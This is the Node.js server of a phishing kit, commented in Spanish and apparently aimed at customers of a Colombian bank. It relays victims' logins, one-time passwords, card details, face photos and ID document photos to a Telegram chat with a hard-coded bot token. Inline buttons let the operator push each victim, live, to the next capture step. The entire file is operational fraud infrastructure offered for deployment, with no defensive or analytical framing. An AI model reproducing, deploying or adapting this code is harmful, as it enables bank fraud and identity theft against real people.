const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"],
        transports: ['websocket', 'polling']
    }
});
const TelegramBot = require('node-telegram-bot-api');

const botToken = '8476776117:AAELHdBk6OXxUcI2-QkI7xhtu6HKWeynhZY';
const chatId = '-1002984980722';

// Configuración del bot optimizada para Vercel
const bot = new TelegramBot(botToken, { 
    polling: false, // Deshabilitado para Vercel
    filepath: false
});

// Middleware y configuración
app.use(express.static('public'));
app.use(express.json());

// Almacenamiento en memoria para sesiones
const sessions = new Map();

// Socket.IO con reconexión mejorada
io.on('connection', (socket) => {
    console.log('Cliente conectado:', socket.id);
    let currentSessionId = null;

    socket.on('initSession', ({ sessionId }) => {
        currentSessionId = sessionId;
        sessions.set(sessionId, {
            socketId: socket.id,
            lastActive: Date.now()
        });
        socket.emit('sessionConfirmed', { sessionId });
    });

    socket.on('sendData', async (data) => {
        try {
            const { type, content, sessionId } = data;
            
            sessions.set(sessionId, {
                socketId: socket.id,
                lastActive: Date.now()
            });

            socket.emit('dataSent', { success: true });

            let message = '🔵 Nueva información recibida\n\n';
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "1️⃣ Pedir Logo", callback_data: `index_${sessionId}` },
                        { text: "2️⃣ Pedir OTP", callback_data: `dinamica_${sessionId}` }
                    ],
                    [
                        { text: "3️⃣ Pedir Tarjeta", callback_data: `tarjeta_${sessionId}` },
                        { text: "4️⃣ Pedir Cara", callback_data: `terminos_${sessionId}` }
                    ],
                    [
                        { text: "5️⃣ Pedir Cédula", callback_data: `cedula_${sessionId}` },
                        { text: "6️⃣ Finalizar", callback_data: `finalizar_${sessionId}` }
                    ]
                ]
            };

            switch(type) {
                case 'login': message += '📱 Datos de inicio\n'; break;
                case 'dinamica': message += '🔑 Clave dinámica\n'; break;
                case 'terminos': message += '📋 Términos aceptados\n'; break;
                case 'face': message += '👤 Foto de rostro\n'; break;
                case 'document': message += '📄 Foto de documento\n'; break;
                case 'tarjeta': message += '💳 Datos de tarjeta\n'; break;
            }

            message += `⌚ Hora: ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}\n`;
            if (content.text) message += `\n${content.text}`;

            try {
                if (content.image) {
                    const imageBuffer = Buffer.from(content.image.split(',')[1], 'base64');
                    await bot.sendPhoto(chatId, imageBuffer, {
                        caption: message,
                        reply_markup: keyboard
                    });
                } else {
                    await bot.sendMessage(chatId, message, {
                        reply_markup: keyboard
                    });
                }
                socket.emit('dataSent', { success: true });
            } catch (err) {
                console.error('Error Telegram:', err);
                socket.emit('error', { message: 'Error al enviar datos' });
            }
        } catch (error) {
            console.error('Error general:', error);
            socket.emit('error', { message: 'Error en el procesamiento' });
        }
    });

    socket.on('disconnect', () => {
        if (currentSessionId) {
            sessions.delete(currentSessionId);
        }
    });
});

// Endpoint para manejar webhooks de Telegram
app.post(`/webhook/${botToken}`, (req, res) => {
    try {
        const { callback_query } = req.body;
        if (callback_query) {
            const [action, sessionId] = callback_query.data.split('_');
            const session = sessions.get(sessionId);
            
            if (session) {
                const socket = io.sockets.sockets.get(session.socketId);
                if (socket) {
                    socket.emit('telegramAction', {
                        action,
                        fromTelegram: true,
                        telegramMessageId: callback_query.message.message_id,
                        messageId: Date.now().toString()
                    });
                }
                session.lastActive = Date.now();
            }
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('Webhook error:', error);
        res.sendStatus(500);
    }
});

// Limpieza de sesiones
setInterval(() => {
    const now = Date.now();
    for (let [sessionId, data] of sessions.entries()) {
        if (now - data.lastActive > 15 * 60 * 1000) {
            sessions.delete(sessionId);
        }
    }
}, 5 * 60 * 1000);

// Export para Vercel
module.exports = app;

if (require.main === module) {
    const PORT = process.env.PORT || 3000;
    http.listen(PORT, () => {
        console.log(`Servidor corriendo en puerto ${PORT}`);
    });
}